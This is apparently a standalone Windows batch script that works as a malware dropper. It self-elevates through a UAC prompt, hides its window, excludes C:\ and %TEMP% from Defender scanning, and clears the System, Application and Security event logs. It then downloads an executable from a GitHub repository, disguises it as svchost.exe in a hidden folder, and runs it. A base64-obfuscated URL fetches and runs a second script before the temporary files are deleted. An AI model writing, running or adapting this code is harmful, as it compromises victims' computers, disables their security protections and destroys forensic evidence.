@echo off

set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (
  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
  echo UAC.ShellExecute "cmd.exe", "/c """"%~s0"" %params:""=""^&""""", "", "runas", 0 >> "%temp%\getadmin.vbs"
  "%temp%\getadmin.vbs"
  exit /B
)

color 00
mode con cols=1 lines=1
title Windows

powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1

wevtutil cl System >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl Security >nul 2>&1

if not exist "C:\indiva" mkdir "C:\indiva" >nul 2>&1
attrib +s +h "C:\indiva" >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/yutuytuy3213/raw/main/Client.exe' -OutFile 'C:\indiva\svchost.exe'" >nul 2>&1

powershell -Command "Start-Process -FilePath 'C:\indiva\svchost.exe' -WindowStyle Hidden" >nul 2>&1

cmd /c powershell -W 1 -C "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbmlzdDMxMC95dHJ5dHJ5L3Jhdy9tYWluL3BhcnQuYmF0')); iwr $u -OutF $env:temp\s.bat; start -Wait $env:temp\s.bat; rm $env:temp\s.bat" && exit


del /f /q "%temp%\*" >nul 2>&1

